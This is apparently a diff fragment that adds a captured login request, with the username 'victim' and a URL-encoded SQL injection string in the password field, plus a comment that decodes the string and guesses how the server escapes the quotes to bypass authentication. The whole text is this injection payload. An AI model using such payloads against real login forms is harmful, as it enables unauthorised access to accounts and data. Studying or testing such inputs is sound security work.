@@ -1,0 +1,9 @@
+username=victim&password=%5C%27%20or%20%27%20%3D%20%27%20%3B%20--%20
+
+/* in plaintext, here is what I copied into the password field: */
+ *
+ * \' or ' = ' ; -- 
+ *
+ * which (I believe) the server converts to this:
+ * \'' or '' = '' ; -- 
+ */
